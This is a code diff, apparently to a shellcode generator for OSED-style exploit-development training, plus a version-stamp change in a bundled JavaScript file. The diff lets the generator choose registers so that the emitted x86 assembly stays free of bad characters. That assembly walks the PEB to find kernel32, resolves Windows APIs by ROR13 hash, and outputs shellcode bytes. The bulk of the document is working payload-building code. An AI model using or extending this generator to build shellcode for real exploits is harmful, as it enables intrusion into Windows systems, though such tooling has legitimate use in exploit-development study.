@@ -11886,10 +11886,10 @@ var osed_bundle = (() => {
         value = true ? "1.0.4" : globalThis[key2];
         break;
       case "__OSED_BUILD_TIME__":
-        value = true ? "2026-11-20T14:15:37.986Z" : globalThis[key2];
+        value = true ? "2026-11-20T14:18:22.896Z" : globalThis[key2];
         break;
       case "__OSED_GIT_COMMIT__":
-        value = true ? "b38da38110f4" : globalThis[key2];
+        value = true ? "8f85fa1e0015" : globalThis[key2];
         break;
     }
     return typeof value === "string" && value.length > 0 ? value : fallback;
@@ -15206,6 +15206,7 @@ and line, writes shellcode.bin and prints the bytes as a Python literal.
 Exit code 1 means a check failed.
 """
 import collections
+import itertools
 import re
 import sys
 
@@ -15575,29 +15576,50 @@ class Frame:
 
 # ---------------------------------------------------------------- fixed code
 
-def find_kernel32(frame):
+Roles = collections.namedtuple("Roles", "base counter hash exports")
+Roles.__doc__ = """Which register fills each role in the PEB walk and the resolver.
+
+EAX and ESI never move. EAX is the resolver's return value and the destination lodsb
+writes, ESI is the address lodsb reads. The four roles here take the four registers
+left over, in whichever order keeps the code clean: a role decided up front can plant
+a bad char in a ModRM byte, as mov ebx, [esp+0x18] does with its 8b 5c 24 18.
+"""
+
+ROLE_REGISTERS = ("ebx", "ecx", "edx", "edi")
+
+
+def role_assignments():
+    """Every way to fill the four roles. The first is the one the course uses."""
+    return (Roles(*order) for order in itertools.permutations(ROLE_REGISTERS))
+
+
+def find_kernel32(frame, roles):
     return [
         comment("kernel32 base: TEB -> PEB -> loader data -> modules in initialization order."),
-        Op("xor ecx, ecx"),
-        Op("mov eax, dword ptr fs:[ecx+0x30]", "PEB; a register base keeps 00 bytes out of the address"),
+        Op("xor eax, eax"),
+        Op("mov eax, dword ptr fs:[eax+0x30]", "PEB; a register base keeps 00 bytes out of the address"),
         Op("mov eax, dword ptr [eax+0x0c]", "PEB_LDR_DATA"),
         Op("mov esi, dword ptr [eax+0x1c]", "first InInitializationOrderModuleList link"),
         Op("k32_next:"),
-        Op("mov ebx, dword ptr [esi+0x08]", "DllBase of this entry"),
-        Op("lea edi, [esi+0x1c]", "edi -> BaseDllName"),
-        Op("mov esi, dword ptr [esi]", "advance now, the checks below use ebx and edi"),
-        Op("cmp word ptr [edi], 0x18", "Length 0x18 = 12 UTF-16 chars, as in kernel32.dll"),
+        Op(f"mov {roles.base}, dword ptr [esi+0x08]", "DllBase of this entry"),
+        Op(f"lea {roles.exports}, [esi+0x1c]", "-> BaseDllName"),
+        Op("mov esi, dword ptr [esi]", "advance now, the checks below use the base and the name"),
+        Op(f"cmp word ptr [{roles.exports}], 0x18", "Length 0x18 = 12 UTF-16 chars, as in kernel32.dll"),
         Op("jne k32_next"),
-        Op("mov edi, dword ptr [edi+0x04]", "BaseDllName.Buffer"),
-        Op("mov al, byte ptr [edi]"),
+        Op(f"mov {roles.exports}, dword ptr [{roles.exports}+0x04]", "BaseDllName.Buffer"),
+        Op(f"mov al, byte ptr [{roles.exports}]"),
         Op("and al, 0xdf", "upper case"),
         Op("cmp al, 0x4b", "'K' rules out other 12-char names"),
         Op("jne k32_next"),
-        Op(f"mov {frame.slot('kernel32.dll')}, ebx", "kernel32 base"),
+        Op(f"mov {frame.slot('kernel32.dll')}, {roles.base}", "kernel32 base"),
     ]
 
 
-def resolver(frame):
+def resolver(frame, roles):
+    # jecxz is the shortest zero test, so the search prefers ecx for the counter and only
+    # spends the extra two bytes on test/jz when ecx would carry a bad char.
+    at_end = [Op("jecxz rh_none")] if roles.counter == "ecx" else [
+        Op(f"test {roles.counter}, {roles.counter}"), Op("jz rh_none")]
     return [
         comment("Store the resolver address: a backward call pushes it without 00 bytes in the rel32."),
         Op("jmp res_call"),
@@ -15615,43 +15637,43 @@ def resolver(frame):
         Op("push edx"),
         Op("push esi"),
         Op("push edi"),
-        Op("mov ebx, dword ptr [esp+0x18]", "module base (5 saved registers + return address above it)"),
-        Op("mov eax, dword ptr [ebx+0x3c]", "e_lfanew"),
-        Op("mov edi, dword ptr [ebx+eax+0x78]", "export directory RVA"),
-        Op("lea edi, [ebx+edi+0x18]", "edi -> NumberOfNames; the next three fields follow at +4, +8, +0xc"),
-        Op("mov ecx, dword ptr [edi]", "NumberOfNames, walked from the last name down"),
+        Op(f"mov {roles.base}, dword ptr [esp+0x18]", "module base (5 saved registers + return address above it)"),
+        Op(f"mov eax, dword ptr [{roles.base}+0x3c]", "e_lfanew"),
+        Op(f"mov {roles.exports}, dword ptr [{roles.base}+eax+0x78]", "export directory RVA"),
+        Op(f"lea {roles.exports}, [{roles.base}+{roles.exports}+0x18]", "-> NumberOfNames; the next three fields follow at +4, +8, +0xc"),
+        Op(f"mov {roles.counter}, dword ptr [{roles.exports}]", "NumberOfNames, walked from the last name down"),
         Op("rh_scan:"),
-        Op("jecxz rh_none"),
-        Op("dec ecx"),
-        Op("mov esi, dword ptr [edi+0x08]", "AddressOfNames"),
-        Op("add esi, ebx"),
-        Op("mov esi, dword ptr [esi+ecx*4]", "name RVA"),
-        Op("add esi, ebx"),
-        Op("xor edx, edx", "running hash"),
+        *at_end,
+        Op(f"dec {roles.counter}"),
+        Op(f"mov esi, dword ptr [{roles.exports}+0x08]", "AddressOfNames"),
+        Op(f"add esi, {roles.base}"),
+        Op(f"mov esi, dword ptr [esi+{roles.counter}*4]", "name RVA"),
+        Op(f"add esi, {roles.base}"),
+        Op(f"xor {roles.hash}, {roles.hash}", "running hash"),
         Op("xor eax, eax"),
         Op("rh_char:"),
         Op("lodsb"),
         Op("test al, al"),
         Op("jz rh_hashed"),
-        Op("rol edx, 0x13", "same as ror 13; the 0x0d count byte is a common bad char"),
-        Op("add edx, eax"),
+        Op(f"rol {roles.hash}, 0x13", "same as ror 13; the 0x0d count byte is a common bad char"),
+        Op(f"add {roles.hash}, eax"),
         Op("jmp rh_char"),
         Op("rh_hashed:"),
-        Op("cmp edx, dword ptr [esp+0x1c]", "wanted hash"),
+        Op(f"cmp {roles.hash}, dword ptr [esp+0x1c]", "wanted hash"),
         Op("jne rh_scan"),
-        Op("mov esi, dword ptr [edi+0x0c]", "AddressOfNameOrdinals"),
-        Op("add esi, ebx"),
-        Op("movzx ecx, word ptr [esi+ecx*2]", "name index -> function index"),
-        Op("mov esi, dword ptr [edi+0x04]", "AddressOfFunctions"),
-        Op("add esi, ebx"),
-        Op("mov eax, dword ptr [esi+ecx*4]", "function RVA"),
-        Op("add eax, ebx", "function VA"),
+        Op(f"mov esi, dword ptr [{roles.exports}+0x0c]", "AddressOfNameOrdinals"),
+        Op(f"add esi, {roles.base}"),
+        Op(f"movzx {roles.counter}, word ptr [esi+{roles.counter}*2]", "name index -> function index"),
+        Op(f"mov esi, dword ptr [{roles.exports}+0x04]", "AddressOfFunctions"),
+        Op(f"add esi, {roles.base}"),
+        Op(f"mov eax, dword ptr [esi+{roles.counter}*4]", "function RVA"),
+        Op(f"add eax, {roles.base}", "function VA"),
         Op("jmp rh_out"),
         Op("rh_none:"),
         Op("xor eax, eax"),
         Op("rh_out:"),
-        Op("mov edx, dword ptr [esp+0x14]", "return address"),
-        Op("mov dword ptr [esp+0x1c], edx", "over the hash slot, so one add drops both arguments"),
+        Op(f"mov {roles.hash}, dword ptr [esp+0x14]", "return address"),
+        Op(f"mov dword ptr [esp+0x1c], {roles.hash}", "over the hash slot, so one add drops both arguments"),
         Op("pop edi"),
         Op("pop esi"),
         Op("pop edx"),
@@ -15661,6 +15683,27 @@ def resolver(frame):
         Op("ret"),
         Op("main:"),
     ]
+
+
+def choose_roles():
+    """The role assignment whose PEB walk and resolver hold no bad byte, shortest first."""
+    best = None
+    for roles in role_assignments():
+        frame = Frame()
+        frame.slot("resolver")
+        try:
+            placed = place(find_kernel32(frame, roles) + resolver(frame, roles))
+        except BuildError:
+            continue
+        if any(BAD.intersection(encoding) for _, _, encoding in placed):
+            continue
+        size = sum(len(encoding) for _, _, encoding in placed)
+        if best is None or size < best[0]:
+            best = (size, roles)
+    if best is None:
+        raise BuildError("no register assignment keeps the PEB walk and the resolver clear of "
+                         + " ".join(f"{b:02x}" for b in sorted(BAD)) + "; try XOR_ENCODER = True")
+    return best[1]
 
 
 # ---------------------------------------------------------------- the plan
@@ -15724,7 +15767,8 @@ def text_bytes(arg):
 
 
 def build_body(calls):
-    """The plain shellcode as a list of Op, and the (api, dll, hash) table."""
+    """The plain shellcode as a list of Op, the (api, dll, hash) table, and the registers chosen."""
+    roles = choose_roles()
     frame = Frame()
     frame.slot("resolver")
     exit_api = EXIT_APIS.get(EXIT)
@@ -15742,7 +15786,7 @@ def build_body(calls):
         Op("pushad"),
         Op("mov ebp, esp"),
         None,
-    ] + find_kernel32(frame) + resolver(frame)
+    ] + find_kernel32(frame, roles) + resolver(frame, roles)
 
     body.append(comment("Resolve every API once and keep its address in a frame slot."))
 
@@ -15806,7 +15850,7 @@ def build_body(calls):
         body += [comment("Exit: restore the caller's stack and registers and return to it."),
                  Op("mov esp, ebp"), Op("popad"), Op("ret")]
     body[3:4] = frame.reserve()
-    return body, table
+    return body, table, roles
 
 
 def place(ops):
@@ -15904,7 +15948,7 @@ def check(placed, base_offset=0, encoded_with=None):
 def main():
     try:
         calls = parse_config()
-        body, table = build_body(calls)
+        body, table, roles = build_body(calls)
         placed = place(body)
     except BuildError as error:
         print(f"[-] {error}")
@@ -15914,6 +15958,9 @@ def main():
     problems = [] if bytes(whole) == plain else ["the per-line map differs from the whole assembly"]
 
     print(f"[+] {len(calls)} call(s), exit {EXIT}, bad chars {' '.join(f'{b:02x}' for b in sorted(BAD))}")
+    print("[+] PEB walk and resolver registers: "
+          + ", ".join(f"{role} {register}" for role, register in zip(Roles._fields, roles))
+          + ", eax result, esi name cursor")
     print('[+] ROR13 hashes; check one in WinDbg with dx @$osed().sc.hash("<api>", "ROR13")')
     print(f"    {'api':<24} {'dll':<16} hash")
     for api, dll, value in table:
